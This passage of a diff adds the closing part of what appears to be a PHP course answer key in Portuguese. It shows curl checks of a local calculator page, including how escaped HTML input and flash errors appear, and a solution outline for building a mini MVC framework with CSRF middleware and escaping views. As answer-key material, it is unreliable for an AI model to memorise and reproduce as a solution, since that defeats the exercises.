+curl -s -b $jar $url | grep -E '&lt;li&gt;|class="erro"'
+echo "---"
+curl -s -b $jar -o /dev/null --data-urlencode "csrf=$token" --data-urlencode "conta=2 ^ 3" $url
+curl -s -b $jar $url | grep -E '&lt;li&gt;|class="erro"'
+kill $servidor</code></pre>
+<pre class="saida"><code>&lt;p class="erro"&gt;&amp;quot;&amp;lt;b&amp;gt;1&amp;lt;/b&amp;gt;&amp;quot; não é um número&lt;/p&gt;&lt;ol&gt;
+  &lt;li&gt;ans * 10 = 3&lt;/li&gt;
+  &lt;li&gt;0,1 + 0,2 = 0,3&lt;/li&gt;
+---
+  &lt;li&gt;2 ^ 3 = 8&lt;/li&gt;
+  &lt;li&gt;ans * 10 = 3&lt;/li&gt;
+  &lt;li&gt;0,1 + 0,2 = 0,3&lt;/li&gt;</code></pre>
+<p>Na primeira listagem, o erro mostrado é o da <strong>última</strong> conta: o texto com <code>&lt;b&gt;</code> chegou escapado (<code>&amp;lt;b&amp;gt;</code>) na mensagem, e o navegador o exibiria como texto. O erro da divisão por zero já tinha sido consumido. Na segunda listagem, a mensagem de erro sumiu (é <em>flash</em>) e o histórico mostra as contas válidas, da mais nova para a mais antiga. Com o servidor embutido, a página funciona em <code>http://localhost:8795/web.php</code>: é a versão gráfica deste caderno.</p>
+<div class="questao desafio" id="d2">
+<span class="num">D2</span>
+<div class="corpo">
+<p class="titulo">Um mini-framework MVC</p>
+<p>Construa o esqueleto de um <em>framework</em> MVC como o deste site: um <em>front controller</em> (<code>public/index.php</code>), um roteador com parâmetros (o do módulo 10), um contêiner de injeção de dependências simples, <em>controllers</em> que recebem um objeto <code>Request</code> e devolvem um <code>Response</code>, <em>views</em> com escape automático, um <em>middleware</em> de CSRF e um repositório com PDO. Escreva uma página de listagem e uma de cadastro de livros, com testes de integração que façam requisições ao <em>front controller</em> sem servidor.</p>
+</div>
+</div>
+<p><strong>Caminho da solução</strong></p>
+<ul><li><strong>Front controller</strong>: o servidor web manda toda requisição para <code>public/index.php</code> (no Apache, com <code>RewriteRule ^ index.php [L]</code> no <code>.htaccess</code> da pasta <code>public/</code>; no nginx, <code>try_files $uri /index.php?$query_string</code>). Ele carrega o <em>autoload</em> do Composer, monta o contêiner, cria o <code>Request</code> a partir das superglobais, despacha e envia o <code>Response</code>. Só a pasta <code>public/</code> fica exposta: código, <code>.env</code> e <code>vendor/</code> ficam um nível acima.</li><li><strong>Request e Response</strong>: objetos imutáveis (métodos <code>with...</code>, como na PSR-7) em vez de acessar <code>$_POST</code> e chamar <code>header()</code> espalhados; isso é o que permite testar sem servidor: o teste cria um <code>Request</code>, chama a aplicação e inspeciona o <code>Response</code>, sem <code>echo</code> nem cabeçalhos enviados.</li><li><strong>Contêiner</strong>: um array de <em>closures</em> (<code>$c-&gt;set(PDO::class, fn() =&gt; new PDO(...))</code>), com instância única criada sob demanda (<em>lazy</em>). É o que faz o <code>bootstrap/app.php</code> deste site.</li><li><strong>Middlewares</strong>: uma pilha de funções <code>fn(Request $r, Closure $proximo): Response</code>; o de CSRF confere o <em>token</em> em todo <code>POST</code>, e o de autenticação redireciona para o login.</li><li><strong>Views</strong>: um <code>View::render('livros/lista', ['livros' =&gt; $livros])</code> que extrai as variáveis e inclui o <em>template</em>; a função <code>e()</code> escapa, e o <em>layout</em> é aplicado em volta. O League Plates, usado neste site, é uma versão madura dessa ideia.</li><li><strong>Erros</strong>: um <code>set_exception_handler</code> que grava no log e mostra uma página 500 genérica em produção (e o detalhe só com <code>APP_DEBUG=true</code>).</li><li><strong>Testes</strong>: com o PHPUnit, um <code>Request</code> de <code>GET /livros</code> deve devolver 200 com os títulos; um <code>POST /livros</code> sem <em>token</em> deve devolver 403; e um com dados válidos, 303 para a página do livro, com o registro no banco (SQLite em memória).</li></ul>
+<p>Comparar o resultado com o Laravel do módulo 8 mostra o que um <em>framework</em> completo acrescenta (filas, ORM, autenticação pronta) e confirma que não há mágica: são as mesmas peças, mais bem acabadas.</p>
+</section>
+<footer class="fim">
+<p><strong>Fim do gabarito.</strong></p>
+<p>Dominando o PHP · <a href="https://theknowledgeisle.com/">theknowledgeisle.com</a></p>
+</footer>
+</body>
+</html>
